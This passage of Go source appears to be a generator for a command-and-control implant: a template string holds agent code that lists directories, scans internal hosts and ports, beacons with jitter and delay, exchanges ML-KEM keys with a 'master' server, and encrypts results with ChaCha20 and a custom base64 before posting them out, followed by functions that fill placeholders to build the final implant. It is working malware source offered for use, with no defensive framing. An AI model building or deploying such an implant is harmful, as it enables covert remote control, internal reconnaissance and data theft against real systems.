            return strconv.FormatFloat(float64(size)/float64(kb), 'f', 2, 64) + " KB"
        default:
            return strconv.FormatInt(size, 10) + " B"
        }
    }
    func listDir(cmd, file_url, taskid string) {
        var fileNames string
        files, err := ioutil.ReadDir(cmd)
        if err != nil {
            return
        }
        for _, file := range files {
            modTime := file.ModTime()
            modTimeStr := modTime.Format("2006-01-02 15:04:05")
            permissions := file.Mode().String()
            if file.IsDir() {
                fileNames += "dir " +
                    file.Name() +
                    "<" + permissions + "><" + modTimeStr + ">\n"
            } else {
                fileSizeStr := formatFileSize(file.Size())
                fileNames += "fil " + file.Name() +"<" + fileSizeStr + ">" + "<" + permissions + ">" + "<" + modTimeStr + ">\n"
            }
        }
        if fileNames == "" {
            fileNames = "empty"
        }
        dataList, err := json.Marshal([]string{
            cmd,
            fileNames,
        })
        if err != nil {
            return
        }
        fileData := string(dataList)
        encryptedStr := get_encry_s(&fileData)
        encryptedTask := get_encry_s(&taskid)
        data := map[string]string{
            "/*uid*/":    uid,
            "/*result*/": encryptedStr,
            "/*info*/":   encryptedTask,
        }
        post(data, file_url)
    }
    func GET_JITTER(s_jitter string) {
        parsedJitter, err := strconv.Atoi(s_jitter)
        if err != nil || parsedJitter <= 0 {
            return
        }
        a_Mutex.Lock();jitter = parsedJitter;a_Mutex.Unlock()
    }
    func GET_DELAY(s_delay string) {
        parsedTime, err := strconv.ParseInt(s_delay, 10, strconv.IntSize)
        if err != nil || parsedTime <= 0{
            return
        }
        a_Mutex.Lock()
        delay = int(parsedTime)
        d := delay
        a_Mutex.Unlock()
        /*prototime*/
        return
    }
    func split_comment(portList string)[]string{
        var temp_split []string
        var port_list []string
        if strings.Contains(portList, ",") {
            temp_split = strings.Split(portList, ",")
            return temp_split
        } else if strings.Contains(portList, "-") {
            temp_split = strings.Split(portList, "-")
            start_port,_:= strconv.Atoi(temp_split[0])
            end_port,_:= strconv.Atoi(temp_split[1])
            for i := start_port; i <= end_port; i++ {
                str:=strconv.Itoa(i)
                port_list = append(port_list, str)
            }
        } else {
            port_list = append(port_list, portList)
            return port_list
        }
        return port_list
    }
    func scan_u_firends(ip, portList, delay_, option string) {
        var resultBuilder strings.Builder
        var mutex sync.Mutex
        var open_ports, re_url string
        port_list := split_comment(portList)
        if len(port_list) > 65535 {
            return
        }
        sleep_time, err := strconv.Atoi(delay_)
        if err != nil || sleep_time <= 0 {
            return
        }
        if option == "port" {
            for _, port := range port_list {
                sleepSeconds(int64(sleep_time))
                scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
            }
        } else if option == "ping" {
            ip_split := strings.Split(ip, ".")
            new_ip := strings.Join(ip_split[:3], ".") + "."
            ping_list := split_comment(ip_split[3])
            if len(ping_list) > 255 {
                return
            }
            for _, i := range ping_list {
                target := new_ip + i
                for _, p := range port_list {
                    sleepSeconds(int64(sleep_time))
                    scan_port(target, p, sleep_time,&resultBuilder, &mutex)
                }
            }
        }
        open_ports = resultBuilder.String()
        encrypted_data := get_encry_s(&open_ports)
        data := map[string]string{
            "/*uid*/":    uid,
            "/*result*/": encrypted_data,
        }
        re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
        post(data, re_url)
    }
    func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
        timeout := time.Duration(sleep_time) * time.Second
        host := strings.TrimSpace(ip)
        host = strings.TrimPrefix(host, "[")
        host = strings.TrimSuffix(host, "]")
        addr := net.JoinHostPort(host, port)
        conn, err := net.DialTimeout("tcp", addr, timeout)
        if err != nil {return}
        defer conn.Close()
        target := host + ":[" + port + "]"
        mutex.Lock()
        resultBuilder.WriteString(target + "\n")
        mutex.Unlock()
    }
    func getInternalIPs() string {
        var ips []string
        interfaces, _ := net.Interfaces()
        for _, iface := range interfaces {
            if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
                continue
            }
            addrs, _ := iface.Addrs()
            for _, addr := range addrs {
                var ip net.IP
                switch v := addr.(type) {
                case *net.IPNet:
                    ip = v.IP
                case *net.IPAddr:
                    ip = v.IP
                }
                if ip != nil && ip.To4() != nil {
                    ips = append(ips, ip.String())
                }
            }
        }
        return strings.Join(ips, ",")
    }
    /*send*/
    func rotl(x uint32, n uint) uint32 { return (x << n) | (x >> (32 - n))}
    func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {a += b; d ^= a; d = rotl(d, 16); c += d; b ^= c; b = rotl(b, 12); a += b; d ^= a; d = rotl(d, 8); c += d; b ^= c; b = rotl(b, 7); return a, b, c, d}
    func initializeState(key [32]byte, counter uint32, nonce [12]byte) [16]uint32 { return [16]uint32{0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, binary.LittleEndian.Uint32(key[0:4]), binary.LittleEndian.Uint32(key[4:8]), binary.LittleEndian.Uint32(key[8:12]), binary.LittleEndian.Uint32(key[12:16]), binary.LittleEndian.Uint32(key[16:20]), binary.LittleEndian.Uint32(key[20:24]), binary.LittleEndian.Uint32(key[24:28]), binary.LittleEndian.Uint32(key[28:32]), counter, binary.LittleEndian.Uint32(nonce[0:4]), binary.LittleEndian.Uint32(nonce[4:8]), binary.LittleEndian.Uint32(nonce[8:12])} }
    func chacha20Block(key [32]byte, counter uint32, nonce [12]byte) [64]byte { state := initializeState(key, counter, nonce); working := state; for i := 0; i < 10; i++ { working[0], working[4], working[8], working[12] = quarterRound(working[0], working[4], working[8], working[12]); working[1], working[5], working[9], working[13] = quarterRound(working[1], working[5], working[9], working[13]); working[2], working[6], working[10], working[14] = quarterRound(working[2], working[6], working[10], working[14]); working[3], working[7], working[11], working[15] = quarterRound(working[3], working[7], working[11], working[15]); working[0], working[5], working[10], working[15] = quarterRound(working[0], working[5], working[10], working[15]); working[1], working[6], working[11], working[12] = quarterRound(working[1], working[6], working[11], working[12]); working[2], working[7], working[8], working[13] = quarterRound(working[2], working[7], working[8], working[13]); working[3], working[4], working[9], working[14] = quarterRound(working[3], working[4], working[9], working[14]) }; var out [64]byte; for i := range working { working[i] += state[i]; binary.LittleEndian.PutUint32(out[i*4:], working[i]) }; return out }
    func ChaCha20Encrypt(data []byte, key [32]byte, nonce [12]byte, counter uint32) []byte {
        out := make([]byte, len(data))
        for i := 0; i < len(data); i += 64 {
            block := chacha20Block(key, counter, nonce)
            n := len(data) - i
            if n > 64 {
                n = 64
            }
            for j := 0; j < n; j++ {
                out[i+j] = data[i+j] ^ block[j]
            }
            counter++
        }
        return out
    }
    func Encrypt(input []byte) []byte {
        var k [32]byte
        keyMutex.RLock()
        if len(key) != len(k) {
            keyMutex.RUnlock()
            return nil
        }
        copy(k[:], key)
        keyMutex.RUnlock()

        var nonce [12]byte
        if _, err := crand.Read(nonce[:]); err != nil {
            return nil
        }
        cipher := ChaCha20Encrypt(input, k, nonce, 0)
        out := make([]byte, 12+len(cipher))
        copy(out[:12], nonce[:])
        copy(out[12:], cipher)
        return out
    }
    func Decrypt(input []byte) []byte {
        if len(input) < 12 {
            return nil
        }
        var k [32]byte
        keyMutex.RLock()
        if len(key) != len(k) {
            keyMutex.RUnlock()
            return nil
        }
        copy(k[:], key)
        keyMutex.RUnlock()
        var nonce [12]byte
        copy(nonce[:], input[:12])
        return ChaCha20Encrypt(input[12:], k, nonce, 0)
    }
    func get_decry_f(filepath string, data []byte) error {
		if len(data) == 0 {
			return nil
		}
		decrypted := Decrypt(data)
		file, err := os.OpenFile(filepath,os.O_WRONLY|os.O_CREATE|os.O_APPEND,0666,)
		if err != nil {
			return err
		}
		defer file.Close()
		_, err = file.Write(decrypted)
		return err
	}
    func get_encry_s(input *string) string {
        return customBase64Encode(Encrypt([]byte(*input)))
    }
    func get_decry_s(input *string) string {
        data := customBase64Decode(*input)
        if data == nil {
            return ""
        }
        return string(Decrypt(data))
    }
    // 编码函数
    func customBase64Encode(data []byte) string {
        var buf bytes.Buffer
        length := len(data)
        for i := 0; i < length; i += 3 {
            remain := length - i
            var b1, b2, b3 byte
            b1 = data[i]
            if remain > 1 {
                b2 = data[i+1]
            }
            if remain > 2 {
                b3 = data[i+2]
            }
            val := uint32(b1)<<16 | uint32(b2)<<8 | uint32(b3)
            outCount := 4
            if remain == 1 {
                outCount = 2
            } else if remain == 2 {
                outCount = 3
            }
            for j := 0; j < outCount; j++ {
                index := (val >> uint(18-6*j)) & 0x3F
                buf.WriteByte(base_rounds[index])
            }
        }
        return buf.String()
    }
    func customBase64Decode(s string) []byte {
        var (
            val  uint32
            valb int
        )
        a_Mutex.RLock()
        m := decodeMap
        a_Mutex.RUnlock()
        out := make([]byte, 0, len(s))
        for i := 0; i < len(s); i++ {
            v, ok := m[s[i]]
            if !ok {
                continue
            }
            val = (val << 6) | uint32(v)
            valb += 6
            if valb >= 8 {
                valb -= 8
                out = append(out, byte((val>>valb)&0xFF))
            }
        }
        return out
    }
    func buildDecodeMap() map[byte]int {
        m := make(map[byte]int)
        for i := 0; i < len(base_rounds); i++ {
            m[base_rounds[i]] = i
        }
        return m
    }
    func generateUUID() string {
        n, err := crand.Int(crand.Reader, big.NewInt(7))
        if err != nil {
            return ""
        }
        uuid := make([]byte, 6+int(n.Int64()))
        if _, err := io.ReadFull(crand.Reader, uuid); err != nil {
            return ""
        }
        if len(uuid) > 6 {
            uuid[6] = (uuid[6] & 0x0f) | 0x40
        }
        if len(uuid) > 8 {
            uuid[8] = (uuid[8] & 0x3f) | 0x80
        }
        uuidStr := byteSliceToHex(uuid)
        return customBase64Encode([]byte(uuidStr))
    }
    func byteSliceToHex(bytes []byte) string {
        hexChars := "0123456789abcdef"
        result := make([]byte, len(bytes)*2)
        for i, b := range bytes {
            result[i*2] = hexChars[b>>4]
            result[i*2+1] = hexChars[b&0x0f]
        }
        return string(result)
    }
    func sleepSeconds(seconds int64) {
        if seconds <= 0 {
            return
        }
        const chunkSeconds int64 = 24 * 60 * 60 
        for seconds > 0 {
            current := seconds
            if current > chunkSeconds {
                current = chunkSeconds
            }
            time.Sleep(time.Duration(current) * time.Second)
            seconds -= current
        }
    }
	func sleepdelay() {
		a_Mutex.RLock();wait := int64(delay);jitterValue := int64(jitter);a_Mutex.RUnlock()
		if wait < 0 {wait = 1}
		if wait > 30 && jitterValue > 0 {
			n, err := crand.Int(crand.Reader, big.NewInt(jitterValue))
			if err != nil {
				return
			}
			add := n.Int64()
			if add < 0 {
				add = 0
			}
			if add > math.MaxInt64-wait {
				wait = math.MaxInt64
			} else {
				wait += add
			}
		}
		sleepSeconds(wait)
	}
	func generateAndUpdateKey(url string){
		base_respBody := getUrl(url)
		serverPubKeyBytes := customBase64Decode(base_respBody)
		sleepdelay()
		if len(serverPubKeyBytes) != mlkem.EncapsulationKeySize768 {
            return
        }
		serverPubKey, err := mlkem.NewEncapsulationKey768(serverPubKeyBytes)
		if err != nil {
			return
		}
		sharedKey, ciphertext := serverPubKey.Encapsulate()
        if len(sharedKey) != mlkem.SharedKeySize || len(ciphertext) != mlkem.CiphertextSize768 {
            return
        }
		ciphertextBase64 := customBase64Encode(ciphertext)
		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + ciphertextBase64
        getUrl(key_url)
        keyMutex.Lock();key = sharedKey;keyMutex.Unlock()
        a_Mutex.Lock();onece = false;a_Mutex.Unlock()
	}
    func run() {
        a_Mutex.RLock();runonece:=onece;a_Mutex.RUnlock()
        if runonece {
            a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.Unlock()
            if uid == "" {uid = generateUUID()}
            host, _ := os.Hostname()
            ver := "cmd"
            switch osname {
            case "linux", "macos":
                ver = "bash"
            case "android":
                ver = "/system/bin/sh"
            }
            a_Mutex.Lock();version = ver;clientname = host;a_Mutex.Unlock()
            client_b := customBase64Encode([]byte(host))
            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
            for {
                generateAndUpdateKey(url)
                keyMutex.RLock();key_ := key;keyMutex.RUnlock()
                a_Mutex.RLock();onece_:=onece;a_Mutex.RUnlock()
                if !onece_ && len(key_) == 32 {
                    send()
                    getCmd()
                }
            }
        }else{getCmd()}
    }
    `
    // 替换占位符
	replacements := map[string]string{
		`/\*sys_str\*/`:           sys_str,
		`/\*tls_str\*/`:           tls_str,
		`/\*protocol_var\*/`:      protocol_var,
		`/\*os\*/`:                o_os,
		`/\*Username\*/`:          u_username,
		`/\*server\*/`:            s_server,
		`/\*main_str\*/`:          main_str,
		`/\*os_str\*/`:            os_str,
		`/\*Path\*/`:              Path,
		`/\*ConnPath\*/`:          ConnPath,
		`/\*MsgPath\*/`:           MsgPath,
        `/\*package_str\*/`:       package_str,
        `/\*switch_key\*/`:        switch_key,
        `/\*download\*/`:          download,
        `/\*result\*/`:            result,
        `/\*_net\*/`:              _net,
        `/\*info\*/`:              info,
        `/\*upload\*/`:            upload,
        `/\*list\*/`:              list,
        `/\*option\*/`:            option,
        `/\*uid\*/`:                uid,
        `/\*hostname\*/`:          hostname,
        `/\*keyPart\*/`:           keyPart,
        `/\*filekey\*/`:           filekey,
        `/\*code\*/`:              code,
        `/\*base_rounds\*/`:      base_rounds,
        `/\*send\*/`:             send,
        `/\*inithttp\*/`:         inithttp,   
        `/\*prototime\*/`:         prototime,
        `/\*header\*/`:           header,
	}
    //先将code中的关键词进行替换
	processedCode := replacePlaceholders(code, replacements, `/\*code\*/`)
    // 再将 send 字符串中的关键词进行替换
    processedSend := replacePlaceholders(send, replacements, `/\*send\*/`)
    // 更新 replacements 中的 send
    replacements[`/\*send\*/`] = processedSend
    // 最后整体替换模板
    final := applyTemplate(templateStr, processedCode, replacements)
    return final
}

func replacePlaceholders(input string, replacements map[string]string, skipKey string) string {
	for pattern, replacement := range replacements {
		if pattern == skipKey {
			continue
		}
		re := regexp.MustCompile(pattern)
		input = re.ReplaceAllLiteralString(input, replacement)
	}
	return input
}

func applyTemplate(templateStr, processedCode string, replacements map[string]string) string {
	const codeKey = `/\*code\*/`
	// 替换其他字段
	for pattern, replacement := range replacements {
		if pattern == codeKey {
			continue
		}
		re := regexp.MustCompile(pattern)
		templateStr = re.ReplaceAllLiteralString(templateStr, replacement)
	}
	// 最后替换 code 部分
	re := regexp.MustCompile(codeKey)
	templateStr = re.ReplaceAllLiteralString(templateStr, processedCode)

	return templateStr
}
